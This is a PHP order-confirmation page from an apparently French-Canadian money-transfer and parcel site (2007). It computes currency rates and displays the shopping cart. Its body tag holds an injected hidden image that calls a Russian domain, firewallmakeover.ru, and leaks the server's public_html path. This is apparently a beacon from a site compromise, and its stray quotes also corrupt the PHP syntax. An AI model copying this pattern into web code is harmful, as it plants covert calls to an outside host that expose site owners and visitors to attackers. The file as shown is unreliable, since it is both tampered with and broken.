<?php
/* Programme : confirme_commande.php
* Description : Demande confirmation de l'usager pour une commande (Transfert ou Colis).
* Auteur : Denis Léveillé 	 		  Date : 2007-10-28
*/
include('lib/config.php');

	$TabService	= 	get_service("");	   
	$TabUnite	= 	get_unite();
	$TabTrs		= 	get_money( "Transfert" );
	$TabModPay	= 	get_Modepaye(); 

 
	$infosClient = infos_client( $_SESSION[$_SERVER['SERVER_NAME']] );
	
	$TxCUC_USD = get_TauxVente("CUC");  
	$TXUSD_CAD = get_TauxAchat("CAD"); 
	$TXUSD_EUR = get_TauxAchat("EUR"); 
	
	// **** Choix de la langue de travail ****
	switch( $_SESSION['langue'] ) {
		case "en" : 	include("trsmessen.inc");
							break;
		case "fr" : 	include("trsmessfr.inc");
							break;
		default : 		include("trsmesssp.inc");  
	} // switch SLangue

	$FctDate			= $_SESSION['Totaux']['DateFacture'];
	$FrTransant =	$_SESSION['transaction']['FrTransant'];
	$FrFixe		=	$_SESSION['transaction']['FrFixe'];
	$CoutUS		=	$_SESSION['transaction']['CoutUS'];
	$CurTrans	=	$_SESSION['transaction']['CurTrans'];
	$Pourcent	=	$_SESSION['transaction']['Pourcent'];
	$Plus			=	$_SESSION['transaction']['Plus'];
	$ModePaye	=	$_SESSION['paiement']['ModePaye'];
	$Total		=	$_SESSION['Totaux']['totalpourbanque']; 
	$Service		=	$_SESSION['transaction']['Service'];
	
	$DevDisp = $_SESSION['devise'];
	$TauxChg = get_TauxVente($DevDisp);
	
	// Image de la devise actuel payé
	switch( $_SESSION['devise'] ) {
		case 'CUC':	$image = 'images/cuba.gif';
						break;
		case 'USD': $image = 'images/usa.gif';
						break;
		case 'EUR': $image = 'images/europe.gif';
						break;
		default	 : $image = 'images/canada.gif';
						break;
	}
		
	// Image de la devise USD
	$imageUSD = 'images/usa.gif';
	
	// Image de la devise de la transaction
	switch( $CurTrans ) {
		case 'CUC':	$imageTRS = 'images/cuba.gif';
						break;
		case 'USD': $imageTRS = 'images/usa.gif';
						break;
		case 'EUR': $imageTRS = 'images/europe.gif';
						break;
		default	 : $imageTRS = 'images/canada.gif';
						break;
	}
	
	
	if( ($TabUnite[$Service] == "POID/WEIGHT") || ($TabUnite[$Service] == "UNITÉ/UNIT") ) { 
		$Transfert	=	$TransUS		=	"";
		$Titre = $txt['sommaire_dela_livraison'];
		$recalc = "paquet_calcul.php";
		$Poids 		= 	$_SESSION['transaction']['Poids'];
		$Assurance	=	$_SESSION['transaction']['Assurance']; 
		$Douane		=	$_SESSION['transaction']['Douane'];
	}
	elseif( $TabUnite[$Service] == "ARGENT/CASH" ) {
		$Transfert	=	$_SESSION['transaction']['Transfert'];
		$TransUS		=	$_SESSION['transaction']['TransUS'];
		$Poids 		= 	$Assurance	=	$Douane		=	"";
		$Titre = $txt['sommaire_du_transfert'];
		$recalc = "transfert_calcul.php";
	}
	else {
		$Transfert	=	$_SESSION['transaction']['Transfert'];
		$TransUS		=	$_SESSION['transaction']['TransUS'];
		$Poids 		= 	$Assurance	=	$Douane		=	"";
		$Titre = $txt['sommaire_du_transfert'];
		$recalc = "certificat_calcul.php";
	}


//	$_AVECENTETE = 1;
	$_AVECCLIENT = 1;
//	$EN_PANIER	= 1;
	$_AVECITEM = 1;
	$_AVECTOTAL = 1;
	$_Retour = 'confirme_commande';

	
echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<base target='MAIN'>
	</head>";
include('styles/style.inc');
echo 
"<body width='$Large' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#FFFFFF' width='$Large' cellpadding='0' cellspacing='0' border='1' align='$Enligne' >
	<tr>
		<td colspan='2'>";
	
$monPanier = panierInfos($_SESSION['panier']);          
          
// HTML pour l'entête du panier, genre <table> avec les entêtes de colonnes          
if( ( $_SESSION['Service'] == $_SERVICE_ACHAT ) && ($monPanier == false) )
   // HTML pour un panier vide
	echo "<p align=center><font size +2><b>".$txt['votre_panier_est_vide']."</b></font></p><br>";
else {
	
?> 
			<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='0' > 
				<tr>
					<td bgcolor='#96B2CB' height='16' Valign='top'> 
						<img src='images/panier.gif' width='14' height='13'/> <font color='#FFFFFF' ><b><?=$txt['paiement_en_ligne_securise']?></b></font>
					</td>
				</tr>
			</table>
		</td>	
	</tr>
	<tr>
		<td colspan='2'  Valign='top'>
			<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='0' bordercolor='#9EA2AB' style='margin-top:2px;' >
<?php	include('commande.inc'); ?>
			</table>
		</td>
	</tr>
	<tr>
		<td colspan='2'  Valign='top'>
			<form method='post' action='commande_ajout.php'>
				<div align='center'><br>
		        	<input name='transid' TYPE='hidden' VALUE='<?=Get_TransId()?>'>
					<input type='submit' value='<?=$txt['placer_ma_commande']?>'>
				</div>
			</form>

<?php
} // FIN DU PANIER N'EST PAS VIDE
 
?>

		</td>
	</tr>
</table>
<script language='javascript'>

function ouvre_plein_ecran(fichier) {
	ff=window.open(fichier,"pop","'','toolbar=no,status=no,scrollbar=no,width=388,height=110, left=330, top=330'");
 	ff.focus();
}  

function Rafraichie(){
	open( "confirme_commande.php", "_self" );
}
</script>
</body>
</html>
